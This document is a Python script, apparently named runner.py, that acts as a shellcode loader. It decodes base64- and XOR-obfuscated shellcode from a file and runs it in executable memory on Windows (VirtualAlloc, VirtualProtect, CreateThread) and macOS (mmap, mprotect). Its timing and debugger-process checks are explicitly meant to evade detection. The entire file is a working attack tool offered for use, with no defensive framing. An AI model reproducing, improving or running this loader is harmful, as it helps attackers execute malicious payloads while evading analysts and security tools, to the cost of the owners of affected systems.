import os
import sys
import time
import base64
import platform
import ctypes
from ctypes import windll, c_int, byref, c_ulong, create_string_buffer, c_void_p, get_last_error, WinError, c_size_t, CFUNCTYPE, Structure, POINTER, c_char, c_uint32, c_ulonglong
from datetime import datetime

class SYSTEM_INFO(Structure):
    _fields_ = [
        ("wProcessorArchitecture", c_int),
        ("wReserved", c_int),
        ("dwPageSize", c_ulong),
        ("lpMinimumApplicationAddress", c_void_p),
        ("lpMaximumApplicationAddress", c_void_p),
        ("dwActiveProcessorMask", c_ulong),
        ("dwNumberOfProcessors", c_ulong),
        ("dwProcessorType", c_ulong),
        ("dwAllocationGranularity", c_ulong),
        ("wProcessorLevel", c_int),
        ("wProcessorRevision", c_int),
    ]

class ShellRunner:
    # Memory constants
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    
    # Memory protection constants
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READWRITE = 0x40
    
    def __init__(self):
        self.shellcode = None
        self.platform = self._get_platform()
        
    def _get_platform(self):
        if platform.mac_ver()[0]:
            return "darwin"
        elif platform.system().lower() == "windows":
            return "windows"
        else:
            return "linux"
            
    def _check_environment(self):
        """Environment checks to evade detection"""
        start_time = datetime.now()
        time.sleep(3)
        elapsed = (datetime.now() - start_time).total_seconds()
        if elapsed < 2.5:
            sys.exit()
            
        if self.platform == "darwin":
            suspicious = ["lldb", "ida64", "gdb", "x64dbg", "ollydbg"]
            try:
                import psutil
                for proc in psutil.process_iter(['name']):
                    if any(s in proc.info['name'].lower() for s in suspicious):
                        sys.exit()
            except:
                pass

    def _allocate_memory(self, shellcode):
        """Allocate memory for shellcode with platform-specific methods"""
        if self.platform == "windows":
            kernel32 = windll.kernel32
            size = len(shellcode)
            
            # Try to allocate memory in the lower 2GB of address space
            addr = None
            for i in range(32):  # Try multiple times with different addresses
                try:
                    suggested_addr = (0x01000000 + (i * 0x1000000)) & 0x7FFFFFFF
                    addr = kernel32.VirtualAlloc(
                        suggested_addr,
                        c_uint32(size),
                        self.MEM_COMMIT | self.MEM_RESERVE,
                        self.PAGE_READWRITE  # Initially only RW
                    )
                    if addr:
                        break
                except:
                    continue
            
            if not addr:
                # Fallback to letting Windows choose
                addr = kernel32.VirtualAlloc(
                    0,
                    c_uint32(size),
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_READWRITE  # Initially only RW
                )
                
            if not addr:
                error = get_last_error()
                raise WinError(error)
                
            return addr & 0xFFFFFFFF  # Ensure 32-bit address
            
        elif self.platform == "darwin":
            PROT_READ = 0x1
            PROT_WRITE = 0x2
            PROT_EXEC = 0x4
            MAP_PRIVATE = 0x2
            MAP_ANON = 0x1000
            
            size = len(shellcode)
            libc = ctypes.CDLL('libc.dylib')
            addr = libc.mmap(
                None,
                size,
                PROT_READ | PROT_WRITE,  # Initially only RW
                MAP_ANON | MAP_PRIVATE,
                -1,
                0
            )
            
            if addr == -1:
                raise OSError("Memory allocation failed")
                
            return addr

    def load_and_run(self, shellcode_file):
        """Main method to load and execute shellcode from file"""
        try:
            # Initial environment checks
            self._check_environment()
            
            # Read and decode shellcode from file
            with open(shellcode_file, 'rb') as f:
                encoded_shellcode = f.read()
            
            # Decode base64
            try:
                shellcode = base64.b64decode(encoded_shellcode)
            except:
                print("Error: Invalid base64 encoding")
                return False
            
            # XOR decode
            try:
                decoded = bytes(b ^ 15 for b in shellcode)
            except:
                print("Error: XOR decoding failed")
                return False
            
            # Allocate memory
            try:
                ptr = self._allocate_memory(decoded)
                if not ptr:
                    print("Error: Memory allocation failed")
                    return False
                print(f"[+] Memory allocated at: 0x{ptr & 0xFFFFFFFF:08x}")
            except Exception as e:
                print(f"Error allocating memory: {str(e)}")
                return False
                
            # Copy shellcode to allocated memory
            if self.platform == "windows":
                try:
                    # Create buffer and copy shellcode
                    buffer = (c_char * len(decoded)).from_buffer_copy(decoded)
                    
                    # Copy to allocated memory (while it's RW)
                    ctypes.memmove(c_void_p(ptr & 0xFFFFFFFF), buffer, len(decoded))
                    
                    # Change memory protection to RX
                    old_protect = c_ulong(0)
                    if not windll.kernel32.VirtualProtect(c_void_p(ptr & 0xFFFFFFFF), len(decoded), self.PAGE_EXECUTE_READ, byref(old_protect)):
                        raise WinError()
                    
                    print("[+] Memory protection set to RX")
                    
                    # Create and run thread
                    thread_id = c_ulong(0)
                    handle = windll.kernel32.CreateThread(
                        None,
                        0,
                        c_void_p(ptr & 0xFFFFFFFF),
                        None,
                        0,
                        byref(thread_id)
                    )
                    
                    if not handle:
                        raise WinError()
                        
                    print("[+] Thread created, waiting for execution...")
                    windll.kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)
                    
                except Exception as e:
                    print(f"Error during execution: {str(e)}")
                    return False
                
            elif self.platform == "darwin":
                try:
                    # Copy shellcode while memory is RW
                    ctypes.memmove(ptr, decoded, len(decoded))
                    
                    # Change to RX for execution
                    PROT_READ = 0x1
                    PROT_EXEC = 0x4
                    libc = ctypes.CDLL('libc.dylib')
                    if libc.mprotect(ptr, len(decoded), PROT_READ | PROT_EXEC) == -1:
                        raise OSError("Failed to set memory protection")
                        
                    function = CFUNCTYPE(c_void_p)(ptr)
                    function()
                except Exception as e:
                    print(f"Error during execution: {str(e)}")
                    return False
                
            return True
            
        except Exception as e:
            print(f"Error: {str(e)}")
            return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python runner.py <shellcode_file>")
        sys.exit(1)
        
    runner = ShellRunner()
    shellcode_file = sys.argv[1]
    
    if not os.path.exists(shellcode_file):
        print(f"Error: File {shellcode_file} not found")
        sys.exit(1)
        
    success = runner.load_and_run(shellcode_file)
    if not success:
        print("Failed to execute shellcode")
        sys.exit(1)
